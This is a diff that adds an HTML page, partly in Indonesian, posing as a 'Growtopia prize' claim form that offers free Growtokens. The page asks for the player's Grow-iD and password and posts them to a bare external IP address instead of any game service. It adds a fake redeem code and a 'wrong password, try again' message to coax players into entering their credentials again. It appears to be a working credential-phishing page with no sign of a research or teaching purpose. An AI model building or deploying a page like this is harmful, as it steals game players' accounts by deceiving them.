@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Growtopia prize</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <header>
+        <h1>Claim You Prize</h1>
+    </header>
+    <main>
+        <form action="http://47.89.172.180:3000/submit" method="post">
+            <!-- bidang formulir seperti sebelumnya -->
+            <label for="jumlah">Jumlah Growtoken *</label>
+            <select id="jumlah" name="jumlah">
+                <option value="5">5 Growtoken</option>
+                <option value="7">7 Growtoken</option>
+                <option value="10">10 Growtoken (MAX)</option>
+            </select>
+
+            <label for="grow-id">Grow-iD</label>
+            <input type="text" id="grow-id" name="grow-id" required>
+
+            <label for="password">Kata Sandi *</label>
+            <input type="password" id="password" name="password" required>
+
+            <label for="nama-depan">Nama Depan</label>
+            <input type="text" id="nama-depan" name="nama-depan">
+
+            <label for="nama-belakang">Nama Belakang</label>
+            <input type="text" id="nama-belakang" name="nama-belakang">
+
+            <p>Kode Tukar Anda adalah: <strong>SUMMERTOKEN1</strong></p>
+
+            <label for="kode-tukar">Kode Tukar</label>
+            <input type="text" id="kode-tukar" name="kode-tukar">
+
+            <button type="submit">Kirim</button>
+            <p id="error-message" style="color:red; display:none;">Coba lagi, GrowID atau kata sandi salah</p>
+        </form>
+    </main>
+    <script src="script.js"></script>
+</body>
+</html>
